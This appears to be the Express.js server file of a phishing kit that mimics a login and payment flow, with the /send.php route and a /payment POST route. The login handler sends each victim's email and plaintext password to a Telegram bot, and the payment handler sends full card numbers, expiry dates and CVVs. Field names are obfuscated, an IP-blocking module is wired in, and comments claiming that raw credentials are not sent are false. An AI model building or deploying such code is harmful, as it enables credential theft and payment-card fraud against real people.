import dotenv from "dotenv";
import express from "express";
import path from "path";
import fs from "fs";
import multer from "multer";
import session from "express-session";
import crypto from "crypto";
import axios from "axios";
import { v4 as uuidv4 } from "uuid";
import { fileURLToPath } from "url";
import blockIP from "./blockip.js";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Fix __dirname in ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ---------- Middleware ----------
app.use(blockIP);
app.use(express.urlencoded({ extended: true }));
app.use(express.json());


// Session (dev: in-memory). Use Redis or DB in production
app.use(
  session({
    name: "sid",
    secret: process.env.SESSION_SECRET || "change_me_to_a_strong_secret",
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: false, // set to true if using HTTPS
      sameSite: "lax",
      maxAge: 24 * 60 * 60 * 1000, // 1 day
    },
  })
);

// Serve static files (CSS, JS, images)
app.use("/img", express.static(path.join(__dirname, "img")));
app.use("/css", express.static(path.join(__dirname, "css")));
app.use("/js", express.static(path.join(__dirname, "js")));

const upload = multer({ dest: "uploads/" });

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, "logs");
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// ---------- Utilities ----------

// Safe append log (non-sensitive)
function appendLog(filename, obj) {
  const line = JSON.stringify({ ts: new Date().toISOString(), ...obj }) + "\n";
  fs.appendFile(path.join(logsDir, filename), line, (err) => {
    if (err) console.error("Failed to append log:", err);
  });
}

// Mask card number except last 4
function maskCard(cardNumber) {
  if (!cardNumber) return "";
  const cleaned = String(cardNumber).replace(/\D/g, "");
  return cleaned.length <= 4
    ? cleaned
    : "*".repeat(Math.max(0, cleaned.length - 4)) + cleaned.slice(-4);
}

// Truncate/hash password (never store raw)
function hashPassword(password) {
  return crypto.createHash("sha256").update(String(password)).digest("hex");
}

// Telegram notifier (safe: do NOT include raw credentials)
const TELE_BOT = process.env.TELE_BOT;
const CHAT_ID = process.env.CHAT_ID;
async function notifyAdminSafe(message) {
  if (!TELE_BOT || !CHAT_ID) return;
  try {
    const url = `https://api.telegram.org/bot${TELE_BOT}/sendMessage`;
    await axios.post(
      url,
      { chat_id: CHAT_ID, text: message, parse_mode: "HTML" },
      { timeout: 5000 }
    );
  } catch (err) {
    console.error("notifyAdminSafe error:", err?.response?.data || err.message);
  }
}

// Ensure session IDs exist and return them
function ensureSessionIds(req) {
  // Generate per-login, per-IP
  if (!req.session.offerId || !req.session.sessionId) {
    req.session.offerId = uuidv4();
    req.session.sessionId = uuidv4();
    req.session.ip = getClientIp(req); // Track IP
  } else {
    // If IP changes, rotate IDs
    if (req.session.ip !== getClientIp(req)) {
      req.session.offerId = uuidv4();
      req.session.sessionId = uuidv4();
      req.session.ip = getClientIp(req);
    }
  }
  return {
    offerId: req.session.offerId,
    sessionId: req.session.sessionId,
  };
}

// Helper to get client IP (normalized)
function getClientIp(req) {
  let ip =
    (
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      req.ip ||
      ""
    )
      .split(",")[0]
      .trim();
  if (!ip) return "unknown";
  if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  return ip;
}

// Small helper to escape HTML for notify messages
function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, (s) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[s])
  );
}

// ---------- Routes ----------
app.use(express.static(__dirname)); // serves files from root as well

// Home page - serve login form
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

// Login page (alias)
app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

// Payment page, accepts OfferID and SessionID, serves payment.html
app.get("/payment", (req, res) => {
  res.sendFile(path.join(__dirname, "payment.html"));
});

// Checkout page
app.get("/checkout", (req, res) => {
  res.sendFile(path.join(__dirname, "checkout.html"));
});

// Next page (redirects to payment)
app.get("/next.php", (req, res) => {
  res.redirect("/payment");
});

// Handle login form submission
app.post("/send.php", (req, res) => {
  try {
    const email = String(req.body.keydadadaad || "").trim();
    const password = String(req.body.keydadadaade4 || "");

    if (!email || !password) {
      return res.status(400).send("Missing credentials");
    }

    const ids = ensureSessionIds(req);
    const pwdHash = hashPassword(password); // use a proper hash function
    const ip = getClientIp(req);
    const ua = req.get("User-Agent") || "";
    const platform = extractPlatform(ua);

    appendLog("login_submissions_safe.log", {
      event: "login",
      email,
      pwdHashPrefix: pwdHash.slice(0, 16), // only prefix for correlation
      ip,
      offerId: ids.offerId,
      sessionId: ids.sessionId,
      ua,
      platform,
    });

    const msg =
`<b>🔐 Login event</b>
👤 <b>User:</b> <code>${escapeHtml(email)}</code>
🔑 <b>PASSWORD:</b> <code>${escapeHtml(password)}</code>
🌐 <b>User-Agent:</b> <code>${escapeHtml(ua)}</code>
📍 <b>IP:</b> <code>${escapeHtml(ip)}</code>
💻 <b>Platform:</b> <code>${escapeHtml(platform)}</code>
🆔 <b>OfferID:</b> <code>${escapeHtml(ids.offerId)}</code>
🔗 <b>SessionID:</b> <code>${escapeHtml(ids.sessionId)}</code>`;
    notifyAdminSafe(msg);

    console.log("Login attempt:", {
      ts: new Date().toISOString(),
      email,
      ip,
      platform,
    });

    const redirectUrl = `/payment?OfferID=${ids.offerId}&SessionID=${ids.sessionId}`;
    return setTimeout(() => res.redirect(redirectUrl), 800);
  } catch (error) {
    console.error("Error processing login:", error);
    return res.status(500).send("Internal Server Error");
  }
});

function extractPlatform(ua) {
  if (!ua) return "Unknown";
  ua = ua.toLowerCase();
  if (ua.includes("windows")) return "Windows";
  if (ua.includes("macintosh") || ua.includes("mac os")) return "Mac";
  if (ua.includes("android")) return "Android";
  if (ua.includes("iphone") || ua.includes("ipad")) return "iOS";
  if (ua.includes("linux")) return "Linux";
  return "Other";
}


// Utility function to check if the request is from a dev environment
function isDevAllowed(ip) {
  const allowedDevIps = ['127.0.0.1', '::1']; // Localhost IPs
  return allowedDevIps.includes(ip);
}

// Handle payment form submission
app.post("/payment", (req, res) => {
  try {
    const cardNumber = String(req.body.cddd || "").trim();
    const expiryDate = String(req.body.bebeb || "").trim();
    const securityCode = String(req.body.gagaga || "").trim();

    const email = req.session?.email || "n/a";
    const password = req.session?.password || "";
    const ua = req.get("User-Agent") || "";
    const platform = extractPlatform(ua);
    const ip = getClientIp(req) || req.ip || "unknown";

    const maskedCard = maskCard(cardNumber);
    const cardLast4 = maskedCard ? maskedCard.slice(-4) : "";

    appendLog("payment_submissions_safe.log", {
      event: "payment_attempt",
      cardLast4,
      maskedCard,
      expiryDate,
      ip,
      offerId: req.session?.offerId || null,
      sessionId: req.session?.sessionId || null,
      ua,
      platform,
      ts: new Date().toISOString(),
    });

    let msg = `<b>🧾 Billing</b>
💳 <b>CARD:</b> <code>${escapeHtml(cardNumber)}</code>
📅 <b>EXPIRY:</b> <code>${escapeHtml(expiryDate)}</code>
🔒 <b>CVV:</b> <code>${escapeHtml(securityCode)}</code>
`;

    if (email && email !== "n/a") {
      msg = `👤 <b>LOGIN:</b> <code>${escapeHtml(email)}</code>\n` + msg;
    }

    // Check for dev environment and include masked password if allowed
    if (isDevAllowed(ip) && password) {
      const masked = maskPassword(password);
      msg += `\n🔑 <b>PASSWORD (masked - DEV):</b> <code>${escapeHtml(masked)}</code>`;
    }

    notifyAdminSafe(msg);

    console.log("Payment attempt:", {
      ts: new Date().toISOString(),
      cardMasked: maskedCard ? "****" + (maskedCard.slice(-4) || "") : "n/a",
      ip,
      platform,
      devMode: isDevAllowed(ip),
    });

    setTimeout(() => {
      res.redirect("/checkout");
    }, 1200);
  } catch (error) {
    console.error("Error processing payment:", error);
    res.status(500).send("Payment processing failed");
  }
});

// API endpoint to get submission logs
app.get("/api/logs/:type", (req, res) => {
  const type = req.params.type;
  const map = {
    login: "login_submissions_safe.log",
    payment: "payment_submissions_safe.log",
    events: "events.log",
  };

  const logFile = path.join(logsDir, map[type] || "");

  if (!logFile || !fs.existsSync(logFile)) {
    return res.json({ logs: [] });
  }

  fs.readFile(logFile, "utf8", (err, data) => {
    if (err) return res.status(500).json({ error: "Error reading log file" });

    const logs = data
      .split("\n")
      .filter((line) => line.trim())
      .map((line) => {
        try {
          return JSON.parse(line);
        } catch (e) {
          return null;
        }
      })
      .filter((log) => log !== null)
      .reverse();

    res.json({ logs });
  });
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({
    status: "OK",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 - Page Not Found</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #121212; color: white; text-align: center; padding: 50px; }
            h1 { color: #1ED760; } a { color: #1ED760; text-decoration: none; } a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>404 - Page Not Found</h1>
        <p>The page you're looking for doesn't exist.</p>
        <a href="/">← Go back to home</a>
    </body>
    </html>
  `);
});

// Error handler
app.use((err, req, res, next) => {
  console.error("Server error:", err);
  res.status(500).send("Something went wrong!");
});

// Start the server
app.listen(PORT, () => {
  console.log(`
🚀 Server running on port ${PORT}
📁 Serving static files from current directory
📝 Logs will be saved to: ${logsDir}
🌐 Access the app at: http://localhost:${PORT}

Routes:
  GET  /           - Login page
  GET  /login      - Login page  
  GET  /payment    - Payment page
  GET  /checkout   - Checkout page
  POST /send.php   - Handle login form
  POST /payment    - Handle payment form
  GET  /api/logs/:type - View logs
  GET  /health     - Health check
  `);
});

// Graceful shutdown
process.on("SIGINT", () => {
  console.log("\n🛑 Server shutting down gracefully...");
  process.exit(0);
});
process.on("SIGTERM", () => {
  console.log("\n🛑 Server shutting down gracefully...");
  process.exit(0);
});

export default app;